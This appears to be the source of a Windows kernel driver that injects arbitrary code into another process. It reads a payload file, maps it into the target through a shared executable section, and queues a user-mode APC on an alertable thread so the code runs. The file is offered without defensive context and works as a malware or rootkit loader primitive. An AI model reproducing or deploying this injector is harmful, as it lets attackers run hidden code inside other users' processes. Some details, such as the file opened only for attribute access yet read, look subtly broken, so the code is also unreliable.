#include "inject.h"

#define INJ_MEMORY_TAG 'jnI'


HANDLE CreateFile(IN PWSTR FileName, IN ULONG DesiredAccess, IN ULONG ShareAccess, IN ULONG CreateDisposition)
{
	HANDLE					hFile = NULL;
	NTSTATUS				status;
	IO_STATUS_BLOCK			iostatus = { 0 };
	OBJECT_ATTRIBUTES		objectAttributes = { 0 };
	UNICODE_STRING			ustrFileName;

	RtlInitUnicodeString(&ustrFileName, FileName);
	InitializeObjectAttributes(&objectAttributes, &ustrFileName, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);

	status = ZwCreateFile(&hFile, DesiredAccess, &objectAttributes, &iostatus, NULL, FILE_ATTRIBUTE_NORMAL,
		ShareAccess, CreateDisposition, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
	if (!NT_SUCCESS(status))
		return NULL;

	return hFile;
}

BOOL GetFileSize(IN HANDLE FileHandle, OUT PLARGE_INTEGER pFileSize)
{
	NTSTATUS status;
	IO_STATUS_BLOCK ioStatus = { 0 };
	FILE_STANDARD_INFORMATION FileStandard = { 0 };

	status = ZwQueryInformationFile(FileHandle, &ioStatus, &FileStandard, sizeof(FILE_STANDARD_INFORMATION), FileStandardInformation);
	if (!NT_SUCCESS(status))
		return FALSE;

	*pFileSize = FileStandard.EndOfFile;
	return TRUE;
}

BOOL ReadFile(IN HANDLE FileHandle, OUT PVOID Buffer, IN ULONG Length, IN PLARGE_INTEGER ByteOffset)
{
	NTSTATUS status;
	IO_STATUS_BLOCK	iostatus;

	status = ZwReadFile(FileHandle, NULL, NULL, NULL, &iostatus, Buffer, Length, ByteOffset, NULL);
	if (!NT_SUCCESS(status))
		return FALSE;

	return TRUE;
}

VOID InjQueueApcKernelRoutine(PKAPC Apc, PKNORMAL_ROUTINE* NormalRoutine, PVOID* NormalContext, PVOID* SystemArgument1, PVOID* SystemArgument2)
{
	ExFreePoolWithTag(Apc, INJ_MEMORY_TAG);
}

NTSTATUS InjQueueApc(PETHREAD Thread, PKNORMAL_ROUTINE NormalRoutine)
{
	PKAPC Apc = (PKAPC)ExAllocatePoolWithTag(NonPagedPool, sizeof(KAPC), INJ_MEMORY_TAG);
	if (!Apc)
		return STATUS_INSUFFICIENT_RESOURCES;

	KeInitializeApc(Apc, Thread, OriginalApcEnvironment, &InjQueueApcKernelRoutine, NULL, NormalRoutine, UserMode, NULL);

	if (!KeInsertQueueApc(Apc, 0, 0, IO_NO_INCREMENT))
	{
		ExFreePoolWithTag(Apc, INJ_MEMORY_TAG);
		return STATUS_UNSUCCESSFUL;
	}

	return STATUS_SUCCESS;
}

NTSTATUS InjInject(struct InjectParam* param)
{
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	HANDLE hFile = NULL, hProcess = NULL, hSection = NULL;
	CLIENT_ID cid;
	OBJECT_ATTRIBUTES oa;
	SIZE_T SectionSize = 1024000; //1m
	PSYSTEM_PROCESS_INFORMATION pInfo = NULL, pTemp = NULL;
	PVOID LocalSectionMemoryAddress = NULL, RemoteSectionMemoryAddress = NULL;
	CHAR* pCode = NULL;

	hFile = CreateFile(param->FileName, FILE_READ_ATTRIBUTES, FILE_SHARE_READ, FILE_OPEN);
	if (hFile == NULL)
		goto exit;

	LARGE_INTEGER lFileSize;
	if (!GetFileSize(hFile, &lFileSize))
		goto exit;

	LARGE_INTEGER ByteOffset = { 0 };
	pCode = (CHAR*)ExAllocatePoolWithTag(NonPagedPool, lFileSize.LowPart, INJ_MEMORY_TAG);
	if (pCode == NULL)
		goto exit;

	if (!ReadFile(hFile, pCode, lFileSize.LowPart, &ByteOffset))
		goto exit;

	cid.UniqueProcess = param->ProcessId;
	cid.UniqueThread = NULL;

	InitializeObjectAttributes(&oa, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);

	status = ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &cid);
	if (!NT_SUCCESS(status))
		goto exit;

	LARGE_INTEGER MaximumSize;
	MaximumSize.QuadPart = SectionSize;

	status = ZwCreateSection(&hSection, GENERIC_READ | GENERIC_WRITE, &oa, &MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
	if (!NT_SUCCESS(status))
		goto exit;

	status = ZwMapViewOfSection(hSection, ZwCurrentProcess(), &LocalSectionMemoryAddress, 0, 1024000, NULL, &SectionSize, ViewUnmap, 0, PAGE_READWRITE);
	if (!NT_SUCCESS(status))
		goto exit;

	status = ZwMapViewOfSection(hSection, hProcess, &RemoteSectionMemoryAddress, 0, 1024000, NULL, &SectionSize, ViewUnmap, 0, PAGE_EXECUTE_READ);
	if (!NT_SUCCESS(status))
		goto exit;

	RtlCopyMemory(LocalSectionMemoryAddress, pCode, lFileSize.LowPart);

	ULONG dwSize = 0;
	status = ZwQuerySystemInformation(5, NULL, 0, &dwSize);
	status = STATUS_UNSUCCESSFUL;

	pInfo = (PSYSTEM_PROCESS_INFORMATION)ExAllocatePoolWithTag(NonPagedPool, dwSize, INJ_MEMORY_TAG);
	if (pInfo == NULL)
		goto exit;

	pTemp = pInfo;

	status = ZwQuerySystemInformation(5, pTemp, dwSize, &dwSize);
	if (!NT_SUCCESS(status))
		goto exit;

	while (TRUE)
	{
		if (pTemp->UniqueProcessId == param->ProcessId)
		{
			for (int i = 0; i < pTemp->NumberOfThreads; i++)
			{
				if (pTemp->Threads[i].State == StateWait)
				{
					PETHREAD pEThread = NULL;
					status = PsLookupThreadByThreadId(pTemp->Threads[i].ClientId.UniqueThread, &pEThread);
					if (NT_SUCCESS(status))
					{
						if (pEThread->Alertable)
						{
							status = InjQueueApc(pEThread, (PKNORMAL_ROUTINE)(ULONG_PTR)RemoteSectionMemoryAddress);
							ObDereferenceObject(pEThread);
							break;
						}
						ObDereferenceObject(pEThread);
					}
				}
			}
			break;
		}

		pTemp = (PSYSTEM_PROCESS_INFORMATION)(((PUCHAR)pTemp) + pTemp->NextEntryOffset);
		if (pTemp->NextEntryOffset == 0)
			break;
	}

exit:
	if (hFile) ZwClose(hFile);
	if (hProcess) ZwClose(hProcess);
	if (hSection) ZwClose(hSection);
	if (pCode) ExFreePoolWithTag(pCode, INJ_MEMORY_TAG);
	if (pInfo) ExFreePoolWithTag(pInfo, INJ_MEMORY_TAG);
	return status;
}